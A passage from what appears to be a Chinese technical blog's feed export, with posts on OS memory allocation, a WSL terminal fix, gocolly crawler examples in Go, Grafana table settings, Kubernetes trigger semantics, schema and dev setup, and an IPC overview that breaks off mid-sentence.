一段代码运行→编译→汇编语言→机器语言→产生链接文件→将硬盘中程序载入到内存当中运行（完成逻辑地址的分配）\n如C中变量的名字，函数的位置，为逻辑地址。\n3.物理地址生成（逻辑地址对应的物理地址的过程） CPU方面 MMU表示映射关系\n① CPU ALU Arithmetic logic unit 发出请求，为逻辑地址 ② CPU MMU Memory management unit 查找逻辑地址映射表，不存在会去内存中找 ③ 控制器提出内存请求（需要的内容，内容即指令） 内存方面\n④ 内存通过bus发送物理内存地址的内容给CPU OS方面 建立逻辑地址和物理地址之间的映射关系（需在前四部前将映射管理建立好）\n4. 内存安全监测：检查运行的内存是否在对应内存空间范围内 操作系统确保程序的有效访问的地址空间，==起始地址==与==长度==（基址寄存器和界限寄存器），也是操作系统所建立和维护的对应的表。\n三、连续式内存分配：内存碎片与分区的动态分配 内存碎片问题 分区动态分配 第一适配 最佳适配 最差适配 压缩式碎片整理 交换式碎片整理 1.内存碎片问题 什么是碎片？ 为程序分配空间后有一些无法被利用的空闲空间，这就是内存碎片。\n碎片的种类：\n外部碎片：在分配单元间未使用的内存（没分配给程序的那块） 内部碎片：在分配单元中未使用的内存（分配给程序之后，程序无法使用） 2.分区的动态分配 操作系统为了管理空闲与非空闲空间，有对应的内存分配算法：\n首次适配 First-Fit 最优适配 Worst Fit 最佳适配 Best Fit sort First-Fit Worst Fit Best Fit overview 空闲分区链首开始查找，直至找到一个能满足其大小要求的空闲分区为止。然后再按 照作业的大小，从该分区中划出一块内存分配给请求者，余下的空闲分区仍留在空闲分区链中。 最坏适应算法与最佳适应算法的排序正好相反，它的队列指针总是指向最大的空闲区，在进行分配时，总是从最大的空闲 区开始查寻；Worst fit 会按大小递减的顺序形成空闲区链，分配时直接从空闲区链的第一个空闲区中分配 寻找整个空间中最适合的的空间块（比分配请求的大小要大，但其差值是最小的） benefit 该算法倾向于使用内存中低地址部分的空闲区，在高地址部分的空闲区很少被利用，从而保留了高地址部分的大空闲 区。显然为以后到达的大作业分配大的内存空间创造了条件。 给文件分配分区后剩下的空闲区不至于太小，产生碎片的几率最小，对中小型文件分配分区操作有利 每次分配给文件的都是最合适该文件大小的分区，避免吧大空间块拆散 defect 不确定性 容易产生外碎片，（低地址部分不断被划分，留下许多难以利用、很小的空闲区，而每次查找又都从低地址部分开始，会增加查找的开销。) 重新分配慢\n产生很多外部碎片\n易于破坏大的空闲块以致大分区无法被分配 缺点：内存中留下许多难以利用的小的空闲区。 require 按地址排序 分配需要找到合适的分区 重新分配需要检查，看是否自由分区能合并于相邻的空间分区。 按尺寸排列的空闲块列表\n分配很快（获得最大的分区）\n重新分配需要合并相邻的空闲分区，然后调整空闲块列表 需要按尺寸排列好空闲块列表分配需要寻找适合的分区重新分配（空闲块利用)需要搜索及合并相邻的空闲分区 四、连续式内存分配 (contiguous memory allocation)：压缩式与交换式碎片化整理 无论采用那种算法，都会产生内碎片internal fragmentation 和外碎片 External fragmentation ，所以需要对这些碎片进行处理使得碎片减少甚至消失。\n紧致算法 compaction：能够调整内存中运行的程序的位置 什么时候做（重定位） 开销 换入换出 swapping：swapping mechanism，是进程可以临时从主存中交换（或移动）到辅存储（磁盘），并使该内存可供其他进程使用。稍后，系统将进程从辅存交换回主存。 English Version: https://www.geeksforgeeks.org/memory-management-in-operating-system/\n","permalink":"https://www.oomkill.com/2022/04/ch3-contiguous-memory-allocation/","summary":"","title":"ch3 操作内存管理 - 连续内存分配"},{"content":"在Windows Terminal中WSL无法打开错误代码是 process exited with code 4294967295 (0xffffffff)，但在命令行中 通过 \u0026quot;C:\\Windows\\System32\\wsl.exe\u0026quot; -d ubuntu18 是正常的\n解决方法是：通过修改启动的命令为 wsl.exe ~ -d Ubuntu 中间加一个 ~ 可以很好的解决掉\n这种方法存在一个问题，打开的wsl终端将为根目录而不是当前windows目录\nReference Unable to launch WSL Ubuntu\n","permalink":"https://www.oomkill.com/2022/03/wsl-problem-with-windows-terminal/","summary":"","title":"Windows Terminal无法加载WSL  [process exited with code 4294967295 (0xffffffff)]"},{"content":"Introduction 本文对colly如何使用，整个代码架构设计，以及一些使用实例的收集。\nColly是Go语言开发的Crawler Framework，并不是一个完整的产品，Colly提供了类似于Python的同类产品（BeautifulSoup 或 Scrapy）相似的表现力和灵活性。\nColly这个名称源自 Collector 的简写，而Collector 也是 Colly的核心。\nColly Official Docs，内容不是很多，最新的消息也很就远了，仅仅是活跃在Github\nConcepts Architecture 从理解上来说，Colly的设计分为两层，核心层和解析层，\nCollector ：是Colly实现，该组件负责网络通信，并负责在Collector 作业运行时执行对应事件的回调。 Parser ：这个其实是抽象的，官网并未对此说明，goquery和一些htmlquery，通过这些就可以将访问的结果解析成类Jquery对象，使html拥有了，XPath选择器和CSS选择器 通常情况下Crawler的工作流生命周期大致为\n构建客户端 发送请求 获取响应的数据 将相应的数据解析 对所需数据处理 持久化 而Colly则是将这些概念进行封装，通过将事件注册到每个步骤中，通过事件的方式对数据进行清理，抽象来说，Colly面向的是过程而不是对象。大概的工作架构如图\nevent 通过上述的概念，可以大概了解到 Colly 是一个基于事件的Crawler，通过开发者自行注册事件函数来触发整个流水线的工作\nColly 具有以下事件处理程序：\nOnRequest：在请求之前调用 OnError ：在请求期间发生错误时调用 OnResponseHeaders ：在收到响应头后调用 OnResponse： 在收到响应后调用 OnHTML：如果接收到的内容是 HTML，则在 OnResponse 之后立即调用 OnXML ：如果接收到的内容是 HTML 或 XML，则在 OnHTML 之后立即调用 OnScraped：在 OnXML 回调之后调用 OnHTMLDetach：取消注册一个OnHTML事件函数，取消后，如未执行过得事件将不会再被执行 OnXMLDetach：取消注册一个OnXML事件函数，取消后，如未执行过得事件将不会再被执行 Reference\ngoquery\nhtmlquery\nUtilities 简单使用 package main\rimport (\r\u0026quot;fmt\u0026quot;\r\u0026quot;github.com/gocolly/colly\u0026quot;\r)\rfunc main() {\r// Instantiate default collector\rc := colly.NewCollector(\r// Visit only domains: hackerspaces.org, wiki.hackerspaces.org\rcolly.AllowedDomains(\u0026quot;hackerspaces.org\u0026quot;, \u0026quot;wiki.hackerspaces.org\u0026quot;),\r)\r// On every a element which has href attribute call callback\rc.OnHTML(\u0026quot;a[href]\u0026quot;, func(e *colly.HTMLElement) {\rlink := e.Attr(\u0026quot;href\u0026quot;)\r// Print link\rfmt.Printf(\u0026quot;Link found: %q -\u0026gt; %s\\n\u0026quot;, e.Text, link)\r// Visit link found on page\r// Only those links are visited which are in AllowedDomains\rc.Visit(e.Request.AbsoluteURL(link))\r})\r// Before making a request print \u0026quot;Visiting ...\u0026quot;\rc.OnRequest(func(r *colly.Request) {\rfmt.Println(\u0026quot;Visiting\u0026quot;, r.URL.String())\r})\r// Start scraping on https://hackerspaces.org\rc.Visit(\u0026quot;https://hackerspaces.org/\u0026quot;)\r}\r错误处理 package main\rimport (\r\u0026quot;fmt\u0026quot;\r\u0026quot;github.com/gocolly/colly\u0026quot;\r)\rfunc main() {\r// Create a collector\rc := colly.NewCollector()\r// Set HTML callback\r// Won't be called if error occurs\rc.OnHTML(\u0026quot;*\u0026quot;, func(e *colly.HTMLElement) {\rfmt.Println(e)\r})\r// Set error handler\rc.OnError(func(r *colly.Response, err error) {\rfmt.Println(\u0026quot;Request URL:\u0026quot;, r.Request.URL, \u0026quot;failed with response:\u0026quot;, r, \u0026quot;\\nError:\u0026quot;, err)\r})\r// Start scraping\rc.Visit(\u0026quot;https://definitely-not-a.website/\u0026quot;)\r}\r处理本地文件 word.html\n\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Document title\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;List of words\u0026lt;/p\u0026gt;\r\u0026lt;ul\u0026gt;\r\u0026lt;li\u0026gt;dark\u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt;smart\u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt;war\u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt;cloud\u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt;park\u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt;cup\u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt;worm\u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt;water\u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt;rock\u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt;warm\u0026lt;/li\u0026gt;\r\u0026lt;/ul\u0026gt;\r\u0026lt;footer\u0026gt;footer for words\u0026lt;/footer\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rpackage main\rimport (\r\u0026quot;fmt\u0026quot;\r\u0026quot;net/http\u0026quot;\r\u0026quot;github.com/gocolly/colly/v2\u0026quot;\r)\rfunc main() {\rt := \u0026amp;http.Transport{}\rt.RegisterProtocol(\u0026quot;file\u0026quot;, http.NewFileTransport(http.Dir(\u0026quot;.\u0026quot;)))\rc := colly.NewCollector()\rc.WithTransport(t)\rwords := []string{}\rc.OnHTML(\u0026quot;li\u0026quot;, func(e *colly.HTMLElement) {\rwords = append(words, e.Text)\r})\rc.Visit(\u0026quot;file://./words.html\u0026quot;)\rfor _, p := range words {\rfmt.Printf(\u0026quot;%s\\n\u0026quot;, p)\r}\r}\r使用代理交换器 通过 ProxySwitcher , 可以直接使用一批代理IP池进行访问了，然而这里只有RR，如果需要其他的均衡算法，需要有自己实现了\npackage main\rimport (\r\u0026quot;bytes\u0026quot;\r\u0026quot;log\u0026quot;\r\u0026quot;github.com/gocolly/colly\u0026quot;\r\u0026quot;github.com/gocolly/colly/proxy\u0026quot;\r)\rfunc main() {\r// Instantiate default collector\rc := colly.NewCollector(colly.AllowURLRevisit())\r// Rotate two socks5 proxies\rrp, err := proxy.RoundRobinProxySwitcher(\u0026quot;socks5://127.0.0.1:1337\u0026quot;, \u0026quot;socks5://127.0.0.1:1338\u0026quot;)\rif err != nil {\rlog.Fatal(err)\r}\rc.SetProxyFunc(rp)\r// Print the response\rc.OnResponse(func(r *colly.Response) {\rlog.Printf(\u0026quot;Proxy Address: %s\\n\u0026quot;, r.Request.ProxyURL)\rlog.Printf(\u0026quot;%s\\n\u0026quot;, bytes.Replace(r.Body, []byte(\u0026quot;\\n\u0026quot;), nil, -1))\r})\r// Fetch httpbin.org/ip five times\rfor i := 0; i \u0026lt; 5; i++ {\rc.Visit(\u0026quot;https://httpbin.org/ip\u0026quot;)\r}\r}\r随机延迟 该功能可以对行为设置一种特征，以免被反扒机器人检测，并禁止我们，如速率限制和延迟\npackage main\rimport (\r\u0026quot;fmt\u0026quot;\r\u0026quot;time\u0026quot;\r\u0026quot;github.com/gocolly/colly\u0026quot;\r\u0026quot;github.com/gocolly/colly/debug\u0026quot;\r)\rfunc main() {\rurl := \u0026quot;https://httpbin.org/delay/2\u0026quot;\r// Instantiate default collector\rc := colly.NewCollector(\r// Attach a debugger to the collector\rcolly.Debugger(\u0026amp;debug.LogDebugger{}),\rcolly.Async(true),\r)\r// Limit the number of threads started by colly to two\r// when visiting links which domains' matches \u0026quot;*httpbin.*\u0026quot; glob\rc.Limit(\u0026amp;colly.LimitRule{\rDomainGlob: \u0026quot;*httpbin.*\u0026quot;,\rParallelism: 2,\rRandomDelay: 5 * time.Second,\r})\r// Start scraping in four threads on https://httpbin.org/delay/2\rfor i := 0; i \u0026lt; 4; i++ {\rc.Visit(fmt.Sprintf(\u0026quot;%s?n=%d\u0026quot;, url, i))\r}\r// Start scraping on https://httpbin.org/delay/2\rc.Visit(url)\r// Wait until threads are finished\rc.Wait()\r}\r多线程请求队列 package main\rimport (\r\u0026quot;fmt\u0026quot;\r\u0026quot;github.com/gocolly/colly\u0026quot;\r\u0026quot;github.com/gocolly/colly/queue\u0026quot;\r)\rfunc main() {\rurl := \u0026quot;https://httpbin.org/delay/1\u0026quot;\r// Instantiate default collector\rc := colly.NewCollector(colly.AllowURLRevisit())\r// create a request queue with 2 consumer threads\rq, _ := queue.New(\r2, // Number of consumer threads\r\u0026amp;queue.InMemoryQueueStorage{MaxSize: 10000}, // Use default queue storage\r)\rc.OnRequest(func(r *colly.Request) {\rfmt.Println(\u0026quot;visiting\u0026quot;, r.URL)\rif r.ID \u0026lt; 15 {\rr2, err := r.New(\u0026quot;GET\u0026quot;, fmt.Sprintf(\u0026quot;%s?x=%v\u0026quot;, url, r.ID), nil)\rif err == nil {\rq.AddRequest(r2)\r}\r}\r})\rfor i := 0; i \u0026lt; 5; i++ {\r// Add URLs to the queue\rq.AddURL(fmt.Sprintf(\u0026quot;%s?n=%d\u0026quot;, url, i))\r}\r// Consume URLs\rq.Run(c)\r}\r异步 默认情况下，Colly的工作模式是同步的。可以使用 Async 函数启用异步模式。在异步模式下，我们需要调用Wait 等待Collector 工作完成。\npackage main\rimport (\r\u0026quot;fmt\u0026quot;\r\u0026quot;github.com/gocolly/colly/v2\u0026quot;\r)\rfunc main() {\rurls := []string{\r\u0026quot;http://webcode.me\u0026quot;,\r\u0026quot;https://example.com\u0026quot;,\r\u0026quot;http://httpbin.org\u0026quot;,\r\u0026quot;https://www.perl.org\u0026quot;,\r\u0026quot;https://www.php.net\u0026quot;,\r\u0026quot;https://www.python.org\u0026quot;,\r\u0026quot;https://code.visualstudio.com\u0026quot;,\r\u0026quot;https://clojure.org\u0026quot;,\r}\rc := colly.NewCollector(\rcolly.Async(),\r)\rc.OnHTML(\u0026quot;title\u0026quot;, func(e *colly.HTMLElement) {\rfmt.Println(e.Text)\r})\rfor _, url := range urls {\rc.Visit(url)\r}\rc.Wait()\r}\r最大深度 深度是在访问这个页面时，其页面还有link，此时需要采集到入口link几层的link？默认1\npackage main\rimport (\r\u0026quot;fmt\u0026quot;\r\u0026quot;github.com/gocolly/colly\u0026quot;\r)\rfunc main() {\r// Instantiate default collector\rc := colly.NewCollector(\r// MaxDepth is 1, so only the links on the scraped page\r// is visited, and no further links are followed\rcolly.MaxDepth(1),\r)\r// On every a element which has href attribute call callback\rc.OnHTML(\u0026quot;a[href]\u0026quot;, func(e *colly.HTMLElement) {\rlink := e.Attr(\u0026quot;href\u0026quot;)\r// Print link\rfmt.Println(link)\r// Visit link found on page\re.Request.Visit(link)\r})\r// Start scraping on https://en.wikipedia.org\rc.Visit(\u0026quot;https://en.wikipedia.org/\u0026quot;)\r}\rReference\ngocolly\ncolly\n","permalink":"https://www.oomkill.com/2022/03/golib-gocolly/","summary":"","title":"Go每日一库 - gocolly"},{"content":" Select panel title → Inspect → Panel JSON\nSet “type” to \u0026ldquo;table-old\u0026rdquo;\nApply\nThe visualization should now appear as Table (old) and in the right side will appear Column Styles\nColumn Styles → Options → Name pattern set the name of the column to hide\nType → Hidden\nReference：Hide column in table in v8.0\n","permalink":"https://www.oomkill.com/2021/12/grafana-8.0/","summary":"","title":"grafana v8.0+ 隐藏表格字段"},{"content":"overview kubernetes的设计里面大致上分为3部分：\nAPI驱动型的特点 (API-driven) 控制循环（control loops）与 条件触发 （Level Trigger） API的可延伸性 而正因为这些设计特性，才使得kubernetes工作非常稳定。\n什么是Level Trigger与 Edge trigger 看到网上有资料是这么解释两个属于的：\n条件触发(level-trigger，也被称为水平触发)LT指： 只要满足条件，就触发一个事件(只要有数据没有被获取，就不断通知)。\n边缘触发(edge-trigger)ET: 每当状态变化时，触发一个事件。\n通过查询了一些资料，实际上也不明白这些究竟属于哪门科学中的理论，但是具体解释起来看的很明白。\nLEVEL TRIGGERING：当电流有两个级别，VH 和 VL。代表了两个触发事件的级别。如果将VH 设置为LED在正时钟。当电压为VH时，LED可以在该时间线任何时刻点亮。这称为LEVEL TRIGGERING，每当遇到VH 时间线就会触发事件。事件是在时间内的任何时刻开始，直到满足条件。\nEdge TRIGGERING:\n如图所示，会看到上升线与下降线，当事件在上升/下降边缘触发时（两个状态的交点），称为边缘触发（Edge TRIGGERING:）。\n如果需要打开LED灯，则当时钟从VL转换到VH时才会亮起，而不是一家处在对应的时钟线上，仅仅是在过渡时亮起。\n为什么kubernetes使用Level Trigger而不使用Edge trigger 如图所述，两种不同的设计模式，随着时间形状进行相应，当系统在由高转低，或由低转高时，系统处在关闭或者不可控的异常状态下，应如何触发对应的事件呢。\n换一种方式来来解释，比如说通过 加法运算，如下，i=3，当给I+4作为一个操作触发事件。\n# let i=3\r# let i+=4\r# let i\r# echo $i\r7\r当为Edge trigger时操作的情况下，将看到 i+4 ,而在 level trigger 时看到的是 i=7。这里将会从``i+4` 一直到下一个信号的触发。\n信号的干扰 通常情况下，两者是没有区别的，但在大规模分布式网络环境中，有很多因素的影响下，任何都是不可靠的，在这种情况下会改变了我们对事件信号的感知。\n如图所示，图为Level Trigger与Edge trigger 的信号发生模拟，在理想情况下，两者间并没有什么不同。\n一次中断场景 由图可知，Edge trigger当在恰当的时间点发生信号中断，会对整个流产生很大的影响，甚至改变了整个状态，对于较少的干扰并不会对有更好的结果，而单次的中断，使Edge trigger错过了从高到低的变化，而 level trigger 基本上保证了整个信号量的所有改变状态。\n两次中断的场景下 由图可看到，信号的上升和下降中如果存在了中断，Edge trigger 丢失了上升的信号，但最终状态是正确的。\n在信号状态的两次变化时发生了两次中断，Level Trigger与Edge trigger 之间的区别很明显，Edge trigger 的信号错过了第一次上升，而Level Trigger 保持了最后观察到的状态，知道拿到了其他状态，这种模式保证了得到的信号基本的正确性，但是发生延迟到中断恢复后。\n通过运算来表示两种模式的变化情况 完整的信号\n# let i=2\r# let i+1\r# let i-=1\r# let i+1\r# echo $i\r3\rEdge trigger\n# let i=2\r# let i+1 (# let i-=1) miss this\r# let i+1\r# echo $i\r4\r如何使理想状态和实际状态一样呢？ 在Kubernetes中，不仅仅是观察对象的一个信号，还观察了其他两个信号，集群的期待状态与实际状态，期望的状态是用户期望集群所处的状态，如我运行了2个实例（pod）。在最理想的场景下，集群的实际状态与期待状态是相同的，但这个过程会受到任意的外界因素干扰被影响下，实际状态与理想状态发生偏差。\nKubernetes必须接受实际状态，并将其与所需状态调和。不断地这样做，采取两种状态，确定其之间的差异，并纠正其不断的更改，以使实际状态达到理想状态。\n如图所示，在一个Edge trigger 中，最终的结果很可能会与理想中的结果发生偏差。\n当初始实例为1时，并希望扩展为5个副本，然后再向下缩容到2个副本，则Edge trigger环境下将看到以下状态：系统的实际状态不能立即对这些命令作出反应。正如图所述，当只有3个副本在运行时，它可能会终止3个副本。这就给我们留下了0个副本，而不是所需的2个副本。\n# let replicas=1\r# let replicas += 4 # 此时副本数为5，但是这个过程需要时间而不是立即完成至理想状态\r# let replicas -= 3 # 当未完成时又接到信号的变化，此时副本数为3，减去3，很可能实际状态为0，与理想状态2发生了偏差\r而使用Level Trigger时，会总是比较完整的期望状态和实际状态，直到实际状态与期望状态相同。这大大减少了状态同步间（错误）的产生。\nsummary 每一种触发器的产生一定有其道理，Edge trigger本身并不是很差，只是应用场景的不同，而使用的模式也不同，比如nginx的高性能就是使用了Edge trigger模型，如nginx使用了 Level trigger在大并发下，当发生了变更信号等待返回时，发生大量客户端连接在侦听队列，而Edge trigger模型则不会出现这种情况。\n综上所述，kubernetes在设计时，各个组件需要感知数据的最终理想状态，无需担心错过数据变化的过程。而设计kubernentes系统消息通知机制（或数据实时通知机制），也应满足以下要求：\n实时性（即数据变化时，相关组件感觉越快越好）。消息必须是实时的。在list/watch机制下，每当apiserver资源有状态变化事件时，都会及时将事件推送到客户端，以保证消息的实时性。\n消息序列：消息的顺序也很重要。在并发场景下，客户端可能会在短时间内收到同一资源的多个事件。对于关注最终一致性的kubernetes来说，它需要知道哪个是最新的事件，并保证资源的最终状态与最新事件所表达的一致。kubernetes在每个资源事件中都携带一个resourceVersion标签，这个标签是递增的。因此，客户端在并发处理同一资源的事件时，可以比较resourceVersion，以确保最终状态与最新事件的预期状态一致。\n消息的可靠性，保证消息不丢失或者有可靠的重新获取的机制（比如 kubelet和 kube-apisever之间的网络波动（network flashover ）需要保证kubelet在网络恢复后可以接收到网络故障时产生的消息）。\n正是因为Kubernetes使用了 Level trigger才让集群更加可靠。\nReference nginx-event-driven-architecture\nWhat-is-meant-by-edge-triggering-and-level-triggering\n","permalink":"https://www.oomkill.com/2021/12/ch05-listwatch-mechanism/","summary":"","title":"理解kubernetes listwatch机制原理"},{"content":"什么是schema schema一词起源于希腊语中的form或figure，但具体应该如何定义schema取决于应用环境的上下文。schema有不同的类型，其含义与数据科学、教育、营销和SEO以及心理学等领域密切相关。\n在维基百科中将schema解释为，图式，在心里学中主要描述一种思维或行为类型，用来组织资讯的类别，以及资讯之间的关系。它也可以被描述为先入为主思想的心理结构，表示世界某些观点的框架，或是用于组织和感知新资讯的系统。\n但在计算机科学中，从很多地方都可以看到 schema 这个名词，例如 database，openldap，programing language等的。这里可以简单的吧schema 理解为 元数据集合 （metadata component）数据模型，主要包含元素及属性的声明，与其他数据结构组成。\n数据库中的schema 在数据库中，schema 就像一个骨架结构，代表整个数据库的逻辑视图。它设计了应用于特定数据库中数据的所有约束。当在数据建模时，就会产生一个schema。在谈到关系数据库]和面向对象数据库时经常使用schema。有时也指将结构或文本的描述。\n数据库中schema描述数据的形状以及它与其他模型、表和库之间的关系。在这种情况下，数据库条目是schema的一个实例，包含schema中描述的所有属性。\n数据库schema通常分为两类：定义数据文件实际存储方式的**物理数据库schema ；和逻辑数据库schema **，它描述了应用于存储数据的所有逻辑约束，包括完整性、表和视图。常见包括\n星型模式（star schema） 雪花模式（snowflake schema） 事实星座模型（fact constellation schema 或 galaxy schema） 星型模式是类似于一个简单的数据仓库图，包括一对多的事实表和维度表。它使用非规范化数据。\n雪花模式是更为复杂的一种流行的数据库模式，在该模式下，维度表是规范化的，可以节省存储空间并最大限度地减少数据冗余。\n事实星座模式远比星型模式和雪花模式复杂得多。它拥有多个共享多个维度表的事实表。\nKubernetes中的schema 通过上面的阐述，大概上可以明白 schema究竟是什么东西了，在Kubernetes中也有schema的概念，通过对kubernetes中资源（GVK）的规范定义、相互关系间的映射等，schema即k8s资源对象元数据。\n而kubernetes中资源对象即 Group Version Kind 这些被定义在 staging/src/k8s.io/api/type.go中，即平时所操作的yaml文件，例如\napiVersion: apps/v1\rkind: Deployment metadata:\rname: ngx\rnamespace: default\rspec:\rselector: matchLabels:\rapp: ngx\rtemplate: metadata:\rlabels:\rapp: nginx\rspec:\rcontainers:\r- name: ngx-schema\rimage: nginx\rports:\r- containerPort: 80\r而对应的的即为TypeMeta 、ObjectMeta 和 DeploymentSpec,\nTypeMeta 为 kind 与 apiserver\nObjectMeta 为 Name 、Namespace CreationTimestamp等段。\nDeploymentSpec 则对应了 yaml 中的 spec。\n而整个yaml组成了 一个 k8s的资源对象。\ntype Deployment struct {\rmetav1.TypeMeta `json:\u0026quot;,inline\u0026quot;`\r// Standard object metadata.\r// +optional\rmetav1.ObjectMeta `json:\u0026quot;metadata,omitempty\u0026quot; protobuf:\u0026quot;bytes,1,opt,name=metadata\u0026quot;`\r// Specification of the desired behavior of the Deployment.\r// +optional\rSpec DeploymentSpec `json:\u0026quot;spec,omitempty\u0026quot; protobuf:\u0026quot;bytes,2,opt,name=spec\u0026quot;`\r// Most recently observed status of the Deployment.\r// +optional\rStatus DeploymentStatus `json:\u0026quot;status,omitempty\u0026quot; protobuf:\u0026quot;bytes,3,opt,name=status\u0026quot;`\r}\rregister.go 则是将对应的资源类型注册到schema中的类\nvar (\r// TODO: move SchemeBuilder with zz_generated.deepcopy.go to k8s.io/api.\r// localSchemeBuilder and AddToScheme will stay in k8s.io/kubernetes.\rSchemeBuilder = runtime.NewSchemeBuilder(addKnownTypes)\rlocalSchemeBuilder = \u0026amp;SchemeBuilder\rAddToScheme = localSchemeBuilder.AddToScheme\r)\r// Adds the list of known types to the given scheme.\rfunc addKnownTypes(scheme *runtime.Scheme) error {\rscheme.AddKnownTypes(SchemeGroupVersion,\r\u0026amp;Deployment{},\r\u0026amp;DeploymentList{},\r\u0026amp;StatefulSet{},\r\u0026amp;StatefulSetList{},\r\u0026amp;DaemonSet{},\r\u0026amp;DaemonSetList{},\r\u0026amp;ReplicaSet{},\r\u0026amp;ReplicaSetList{},\r\u0026amp;ControllerRevision{},\r\u0026amp;ControllerRevisionList{},\r)\rmetav1.AddToGroupVersion(scheme, SchemeGroupVersion)\rreturn nil\r}\r而 apimachinery 包则是 schema的实现，通过看其内容可以发下，kubernetes中 schema就是 GVK 的属性约束 与 GVR 之间的映射。\n通过示例了解schema 例如在 apps/v1/deployment 这个资源，在代码中表示 k8s.io/api/apps/v1/types.go ，如果需要对其资源进行扩展那么需要怎么做？如，建立一个 StateDeplyment 资源\ntype Deployment struct {\rmetav1.TypeMeta `json:\u0026quot;,inline\u0026quot;`\r// Standard object metadata.\r// +optional\rmetav1.ObjectMeta `json:\u0026quot;metadata,omitempty\u0026quot; protobuf:\u0026quot;bytes,1,opt,name=metadata\u0026quot;`\r如上述代码所示，Deployment 中的 metav1.TypeMeta 和 metav1.ObjectMeta\n那么我们复制一个 Deployment 为 StateDeployment，注意，因为 Deployment的两个属性， metav1.TypeMeta 和 metav1.ObjectMeta 分别实现了不同的方法，如图所示\n所以在实现方法时，需要实现 DeepCopyinfo ， DeepCopy 和继承接口 Object 的 DeepCopyObject 方法\n// DeepCopyInto is an autogenerated deepcopy function, copying the receiver, writing into out. in must be non-nil.\rfunc (in *StateDeployment) DeepCopyInto(out *StateDeployment) {\r*out = *in\rout.TypeMeta = in.TypeMeta\rin.ObjectMeta.DeepCopyInto(\u0026amp;out.ObjectMeta)\rin.Spec.DeepCopyInto(\u0026amp;out.Spec)\rin.Status.DeepCopyInto(\u0026amp;out.Status)\rreturn\r}\r// DeepCopy is an autogenerated deepcopy function, copying the receiver, creating a new StateDeployment.\rfunc (in *StateDeployment) DeepCopy() *StateDeployment {\rif in == nil {\rreturn nil\r}\rout := new(StateDeployment)\rin.DeepCopyInto(out)\rreturn out\r}\r// DeepCopyObject is an autogenerated deepcopy function, copying the receiver, creating a new runtime.Object.\rfunc (in *StateDeployment) DeepCopyObject() runtime.Object {\rif c := in.DeepCopy(); c != nil {\rreturn c\r}\rreturn nil\r}\r那么扩展一个资源的整个流为：\n资源类型在：k8s.io/api/{Group}/types.go 资料类型的实现接口 k8s.io/apimachinery/pkg/runtime/interfaces.go.Object 其中是基于 Deployment 的类型，metav1.TypeMeta 和 metav1.ObjectMeta metav1.TypeMeta 实现了 GetObjectKind() ；metav1.ObjectMeta 实现了DeepCopyinfo=() ， DeepCopy() ，还需要实现 DeepCopyObject() 最后注册资源到schema中 k8s.io/api/apps/v1/register.go ","permalink":"https://www.oomkill.com/2021/11/ch03-kubernetes-schema/","summary":"","title":"理解kubernetes schema"},{"content":"下载源码 根据kubernetes github 方式可以\nmkdir -p $GOPATH/src/k8s.io\rcd $GOPATH/src/k8s.io\rgit clone https://github.com/kubernetes/kubernetes\rcd kubernetes\rmake\r如果有需要可以切换到对应的版本进行学习或者修改，一般kubernetes版本为对应tag\ngit fetch origin [远程tag名]\rgit checkout [远程tag名]\rgit branch\r配置goland kubernetes本身是支持 go mod 的，但源码这里提供了所有的依赖在 staging/src/k8s.io/ 目录下，可以将此目录内的文件复制到 vendor下。\ncp -a staging/src/k8s.io/* vendor/k8s.io/\r对于 k8s.io/kubernetes/pkg/ 发红的（找不到依赖的），可以将手动创建一个目录在 vendor/k8s.io/ 将克隆下来的根目录 pkg 复制到刚才的目录下。\ngoland中，此时不推荐使用go mod模式了，这里goland一定要配置GOPATH的模式。对应的GOPATH加入 {project}/vender即可。 这里可以添加到 goland中 project GOPATH里。\n","permalink":"https://www.oomkill.com/2021/11/ch01-k8s-perpare/","summary":"","title":"k8s开发环境准备 - 如何配置开发环境"},{"content":"What is IPC IPC [Inter-Process Communication] 进程间通信，指至少两个进程或线程间传送数据或信号的一些技术或方法。在Linux/Unix中，提供了许多IPC。Unix七大IPC：\nPipe：无名管道，最基本的IPC，单向通信，仅在父/子进程之间，也就是将一个程序的输出直接交给另一个程序的输入。常见使用为 ps -ef|grep xxx FIFO [(First in, First out)] 或 有名管道（named pipe）:与Pipe不同，FIFO可以让两个不相关的进程可以使用FIFO。单向。 Socket 和 Unix Domain Socket：socket和Unix套接字，双向。适用于网络通信，但也可以在本地使用。适用于不同的协议。 消息队列 Message Queue: SysV 消息队列、POSIX 消息队列。 Signal: 信号，是发送到正在运行的进程通知以触发其事件的特定行为，是IPC的一种有限形式。 Semaphore：信号量，通常用于IPC或同一进程内的线程间通信。他们之间使用队列进行消息传递、控制或内容的传递。（常见SysV 信号量、POSIX 信号量） Shared memory：（常见SysV 共享内存、POSIX 共享内存）。共享内存，是在进程（程序）之间传递数据的有效方式，目的是在其之间提供通信。 每种IPC都有不通的特点，每种方式对资源的使用及性能都是不通的\n管道 I/O是最快的，但为单向通信，需要工作在 父/子 进程关系之间。 UNIX 套接字可以在本地连接不同的进程，并且具有更高的带宽，并且没有固有的消息边界。 TCP/IP套接字可以连接任何进程。并且可以通过网络连接，但是对资源会有更多的开销，同样的没有固定的消息边界。 Reference comparsion Unix/Linux IPC\nWhat is D-Bus 提到，D-Bus就不能不提一下freedesktop，而 D-Bus 仅仅作为freedesktop.org的一部分。\nD-Bus 桌面总线 (Desktop Bus)，的简写，也是Linux- IPC机制，不同于Unix 